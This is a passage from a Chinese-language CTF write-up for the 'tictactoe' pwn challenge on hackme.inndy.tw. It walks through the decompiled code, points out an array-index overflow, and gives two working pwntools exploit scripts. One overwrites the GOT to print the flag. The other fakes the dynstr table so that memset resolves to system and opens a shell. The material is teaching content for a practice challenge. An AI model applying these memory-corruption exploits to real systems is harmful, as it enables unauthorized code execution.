v0;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span> &amp;&amp; !sub_80487F6(); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_804B048 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_80489C0();<span class="comment">//电脑下棋</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_8048762();</span><br><span class="line">      sub_8048A4B();<span class="comment">//我们下棋，漏洞在这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    dword_804B048 = -dword_804B048;<span class="comment">//一人一次</span></span><br><span class="line">  &#125;</span><br><span class="line">  v1 = sub_80487F6();</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8048762();</span><br><span class="line">      sub_80486C7(<span class="string">"You lose. :("</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )<span class="comment">//很明显要跳转到这里才有flag，得找漏洞</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_80486C7(<span class="string">"You win. Inconceivable!"</span>);</span><br><span class="line">      fd = <span class="built_in">open</span>(<span class="string">"flag_simple"</span>, <span class="number">0</span>);</span><br><span class="line">      v5 = <span class="built_in">read</span>(fd, buf, <span class="number">0x100</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( fd &lt;= <span class="number">0</span> || v5 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_80486C7(<span class="string">"Can not read flag! Pls contact admin"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        buf[v5] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Here is your flag: %s\n"</span>, buf);</span><br><span class="line">        sub_80486C7(<span class="string">"You need a shell to get another flag"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_80486C7(<span class="string">"Draw!......"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;dword_804B048, <span class="number">0</span>, <span class="number">0x18</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You sucks!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048A4B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nInput move (9 to change flavor): "</span>);</span><br><span class="line">  v1 = sub_804871C();<span class="comment">//输入函数</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">    byte_804B04C = buf;<span class="comment">//换棋</span></span><br><span class="line">    sub_8048A4B();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(v1 + <span class="number">0x804B056</span>) = byte_804B04C;<span class="comment">//将输入进行赋值，数组下标溢出，v1可以为负数，byte_804B04C是我们的v1=9的输入，而v1相当于下标偏移，这里就可以改写puts的got为cat_flag的地址。</span></span><br><span class="line">    <span class="keyword">if</span> ( sub_80486F0(v1) )</span><br><span class="line">      *(v1 + <span class="number">0x804B04D</span>) = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-d0d8a907921ea16a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>而且由于前面的地址相同，所以只需要写末2位即可。</p>
+<p>这里为了验证方便，分别在0x08048A8A和0x08048A9E的位置下断点，动态调试看看是否改成功了。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-0c34396ba6cb8299.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>修改成功，直接再随便输入一个值即可退出getshell，那么exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./tictactoe'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./tictactoe'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7714</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so.i386'</span>)</span><br><span class="line">cat_flag = <span class="number">0x8048C46</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(addr,offset)</span>:</span>	</span><br><span class="line">    p.recvuntil(<span class="string">"move (9 to change flavor): "</span>)</span><br><span class="line">    p.send(<span class="string">'9'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b *0x08048A8A')</span></span><br><span class="line">    p.send(addr)</span><br><span class="line">    p.recvuntil(<span class="string">"move (9 to change flavor): "</span>)</span><br><span class="line">    p.send(offset)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Play (1)st or (2)nd? "</span>)</span><br><span class="line">p.send(<span class="string">'1'</span>)</span><br><span class="line">change(<span class="string">'\x46'</span>,<span class="string">' -50'</span>)</span><br><span class="line">change(<span class="string">'\x8C'</span>,<span class="string">' -49'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>检验下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-ccec7740669caf48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这是第一种方法，我们尝试用getshell的方法去做:</p>
+<p>这里介绍下dl_runtime_resolve:利用fake_dynstr实现system的调用。</p>
+<p>由ida可知：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-e201786d0310fa6e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>当游戏结束时，调用memset，参数放在0x804B048处，那么利用fake_dynstr实现system调用，再把参数$0写入0x804B048，即可getshell，这里有个坑点，就是每一次轮到机器人时，0x804B048会变成负数，解决方法是统一在奇数位改~</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-32ab4e42a1ab5d5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>0x804AF54存第一个参数标记，0x804AF58存第二个参数即dynstr的地址，那么我们只要改0x804AF58这个指向dynstr的指针即可。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-1a5395dc5ad9ad06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>那么我们就要构造出fake_dynstr表，让system字符串的偏移也是0x44就好了，因为ida咩有system字符串，所以可以自己找找，或者自己写一个到某一个bss地址上（前提是能写），这里先找找先</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-1fdcffbb82da7503.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>找到了现成的直接用，0x804a00c - 0x44 = 0x8049fc8，那么直接改dynstr表地址为这个地址，就可以了，这样偏移为0x44的地方就是我们的system的地方，前面的地址相同，只需要覆盖两位即可，第一轮先填0，好让机会再次把握在我们手中，制造出和局的场面，则exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./tictactoe'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./tictactoe'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7714</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so.i386'</span>)</span><br><span class="line">dynstr = <span class="number">0x0804af58</span></span><br><span class="line">system_str = <span class="number">0x0804a00c</span></span><br><span class="line">fake_dynstr = <span class="number">0x08049fc8</span></span><br><span class="line">player = <span class="number">0x804b048</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line">fake_addr = bss + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(string,addr)</span>:</span></span><br><span class="line">    offset = addr - <span class="number">0x804B056</span>	</span><br><span class="line">    p.recvuntil(<span class="string">"move (9 to change flavor): "</span>)</span><br><span class="line">    p.sendline(<span class="string">'9'</span>)</span><br><span class="line">    p.send(string)</span><br><span class="line">    p.recvuntil(<span class="string">"move (9 to change flavor): "</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b *0x8048AAE')</span></span><br><span class="line">    p.send(str(offset))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Play (1)st or (2)nd? "</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">change(<span class="string">'\x00'</span>,player)<span class="comment">#0，解释下这句有什么用，是为了使最后0x804B048为正，因为0x804B048在正负之间不断跳变，而我们填也是在正数时才填，最后要是正数区域才是显示$0，所以这里相当于缓冲的作用。</span></span><br><span class="line">change(<span class="string">'\x24'</span>,player)<span class="comment">#2</span></span><br><span class="line">change(<span class="string">'\xc8'</span>,dynstr)<span class="comment">#1</span></span><br><span class="line">change(<span class="string">'\x30'</span>,player + <span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">change(<span class="string">'\x9f'</span>,dynstr + <span class="number">1</span>)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#为了退出循环，再玩4次</span></span><br><span class="line">change(<span class="string">'\x00'</span>,fake_addr)</span><br><span class="line">change(<span class="string">'\x00'</span>,fake_addr)</span><br><span class="line">change(<span class="string">'\x00'</span>,fake_addr)</span><br><span class="line">change(<span class="string">'\x00'</span>,fake_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>验收下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-e29bdeeb32c8eb02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这里dl_runtime_resolve的运用，改dynstr表，就要改指向此表的指针，然后构造相同的偏移量~实现趁机fake调用，很棒的操作。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目：tictactoe"><span class="toc-number">1.</span> <span class="toc-text">题目：tictactoe</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
